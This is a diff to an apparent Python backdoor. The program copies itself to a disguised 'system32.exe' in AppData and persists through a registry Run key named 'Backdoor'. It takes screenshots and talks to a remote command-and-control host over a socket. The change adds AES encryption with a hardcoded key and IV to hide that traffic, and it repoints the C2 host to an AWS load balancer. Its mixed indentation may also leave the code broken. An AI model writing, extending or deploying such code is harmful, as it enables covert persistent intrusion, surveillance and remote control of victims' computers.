@@ -10,16 +10,29 @@ from shutil import copyfile
 import sys
 import requests
 from mss import mss
+from Crypto.Cipher import AES
+
+def do_encrypt(message):
+    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    ciphertext = obj.encrypt(message)
+    return ciphertext
+
+def do_decrypt(ciphertext):
+    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    message = obj2.decrypt(ciphertext)
+    return message
 
 def my_send(data):
-        json_data = json.dumps(data)
+	ciphertext1 = do_encrypt(data)
+        json_data = json.dumps(ciphertext1)
         sock.send(json_data)
 def my_recv():
         data = ""
         while True:
                 try:
                         data = data + sock.recv(1024)
-                        return json.loads(data)
+			text = do_decrypt(data)
+                        return json.loads(text)
                 except ValueError:
                         continue
 def screenshot():
@@ -77,7 +90,8 @@ location  = os.environ["appdata"] + "\\system32.exe"
 if not os.path.exists(location):
   shutil.copyfile(sys.executable,location)
   subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell=True)
-HOST = 'ec2-100-20-118-82.us-west-2.compute.amazonaws.com'
+#HOST = 'ec2-100-20-118-82.us-west-2.compute.amazonaws.com'
+HOST = 'agentLB-e9d579b2e376ded2.elb.us-west-2.amazonaws.com'
 PORT = 54436
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #sock.connect(('100.20.118.82', 54436))
